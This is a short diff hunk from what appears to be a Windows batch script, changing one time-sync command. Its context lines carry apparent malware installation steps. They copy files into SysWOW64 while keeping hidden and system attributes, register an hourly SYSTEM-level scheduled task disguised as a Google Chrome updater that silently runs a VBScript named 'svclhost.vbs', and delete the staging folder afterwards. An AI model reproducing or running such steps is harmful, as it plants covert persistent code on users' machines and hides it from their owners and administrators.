@@ -56,7 +56,7 @@ xcopy "C:\Windows\Temp\0test0" "C:\Windows\SysWOW64" /h /i /c /k /e /r /y
 
 SCHTASKS /CREATE /SC MINUTE /MO 60 /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\SysWOW64\svclhost.vbs" /ST %n_tm% /RU system /F
 
-w32tm /resync
+net start w32time
 w32tm /resync
 
 rmdir /Q /S "C:\Windows\Temp\0test0"
